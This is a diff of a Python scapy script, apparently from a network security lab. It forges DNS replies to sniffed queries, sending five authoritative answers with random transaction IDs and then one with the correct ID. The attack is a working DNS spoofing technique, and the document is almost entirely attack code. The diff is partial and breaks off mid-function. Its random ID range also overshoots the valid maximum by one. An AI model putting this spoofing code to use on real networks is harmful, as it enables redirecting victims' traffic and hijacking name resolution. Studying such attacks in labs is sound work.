@@ -1,22 +1,25 @@
 #!/usr/bin/env python3
-# Import scapy libraries
+
+"""
+This script returns DNS responses with wrong TXIDs, then with a correct TXID.
+"""
+
 from scapy.all import *
 import random
 
 # Set the interface to listen and respond on
 net_interface = "eth0"
 
-
-# Berkeley Packet Filter for sniffing specific DNS packet only
-packet_filter = " and ".join([
-    "udp dst port 53",          # Filter UDP port 53
-    "udp[10] & 0x80 = 0"       # DNS queries only
-    ])
-
 # Function that replies to DNS query
 def dns_reply(packet):
 
-    for i in range(0,5):
+    correct_txid =packet[DNS].id
+    txid_list = list()
+    for i in range(5):
+        txid_list.append(random.randint(0,65536))
+    txid_list.append(correct_txid)
+
+    for txid in txid_list:
         # Construct the DNS packet
         # Construct the Ethernet header by looking at the sniffed packet
         eth = Ether(
@@ -38,7 +41,7 @@ def dns_reply(packet):
 
         # Construct the DNS response by looking at the sniffed packet and manually
         dns = DNS(
-            id=random.randint(0,65535),
+            id=int(txid),
             qd=packet[DNS].qd,
             aa=1,
             rd=0,
